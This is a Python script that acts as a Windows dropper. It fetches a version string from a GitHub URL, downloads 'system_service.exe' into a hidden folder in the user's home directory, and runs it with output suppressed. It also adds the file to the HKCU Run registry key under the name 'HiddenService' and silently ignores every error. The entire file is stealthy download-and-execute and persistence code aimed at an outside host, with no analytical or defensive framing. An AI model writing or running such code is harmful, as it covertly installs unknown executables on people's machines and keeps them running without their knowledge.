import os
import urllib.request
import subprocess
from pathlib import Path
import winreg  # For adding to startup

# URLs and constants
VERSION_URL = "https://raw.githubusercontent.com/yesjdnke/manager/refs/heads/main/version.txt"  # Version file URL
FILE_URL = "https://github.com/yesjdnke/manager/releases/download/love/system_service.exe"  # File to download
FOLDER_NAME = ".hidden_service_folder"  # Folder name for hidden service
FILE_NAME = "system_service.exe"  # File name for the service
VERSION_FILE_NAME = "previous_version.txt"  # File to store the last downloaded version

def get_user_hidden_folder():
    """Retrieve or create a hidden directory in the user's home folder."""
    user_home = Path.home()
    hidden_folder_path = user_home / FOLDER_NAME
    if not hidden_folder_path.exists():
        hidden_folder_path.mkdir(parents=True, exist_ok=True)
    return hidden_folder_path

def download_file(url, destination):
    """Download a file from the specified URL to the given destination."""
    with urllib.request.urlopen(url) as response, open(destination, 'wb') as out_file:
        out_file.write(response.read())

def get_remote_version():
    """Retrieve the remote version from the VERSION_URL."""
    try:
        with urllib.request.urlopen(VERSION_URL) as response:
            return response.read().decode('utf-8').strip()
    except Exception:
        return None

def load_local_version(file_path):
    """Read the locally stored version from a file."""
    if not os.path.exists(file_path):
        return None
    with open(file_path, 'r') as file:
        return file.read().strip()

def save_local_version(version, file_path):
    """Write the specified version string to a local file."""
    with open(file_path, 'w') as file:
        file.write(version)

def add_to_startup(file_path):
    """Add the executable to the system startup registry."""
    try:
        with winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE,
        ) as key:
            winreg.SetValueEx(key, "HiddenService", 0, winreg.REG_SZ, str(file_path))
    except Exception:
        pass  # Ignore errors silently

def ensure_and_run_file():
    """
    Ensure the file is downloaded, version-checked, executed, and added to startup.
    - Downloads if the remote version is newer.
    - Saves the current version locally.
    - Adds to system startup on the first download or replacement.
    - Runs the file after ensuring it is present.
    """
    folder_path = get_user_hidden_folder()
    file_path = folder_path / FILE_NAME
    version_file_path = folder_path / VERSION_FILE_NAME

    remote_version = get_remote_version()
    if not remote_version:
        return  # Exit if unable to fetch the remote version

    local_version = load_local_version(version_file_path)

    if local_version == remote_version:
        return  # No update required, versions match

    try:
        download_file(FILE_URL, file_path)
        save_local_version(remote_version, version_file_path)  # Save the new version
        add_to_startup(file_path)  # Add to startup on update or first-time setup
    except Exception:
        return  # Exit silently on download failure

    try:
        subprocess.Popen([str(file_path)], shell=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass  # Silently handle execution failure
